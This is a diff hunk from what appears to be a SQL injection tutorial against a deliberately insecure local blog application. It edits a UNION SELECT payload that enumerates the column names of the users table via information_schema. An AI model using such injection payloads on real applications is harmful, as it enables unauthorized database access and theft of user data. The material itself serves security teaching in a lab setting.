@@ -28,7 +28,7 @@ SELECT column_name FROM information_schema.columns WHERE table_schema='insecure_
 
 Just like before we inject the query in the browser:
 ```shell
-http://localhost:8080/p/2 UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema='insecure_blog' AND table_name='users' LIMIT 1 OFFSET 0),3,4,5,6,7,8,9/slug-name-post'
+http://localhost:8080/p/2 UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema='insecure_blog' AND table_name='users' LIMIT 1 OFFSET 0),3,4,5,6,7,8,9,10/slug-name-post'
 ```
 
 And keep **increasing the OFFSET** value to get all the columns.
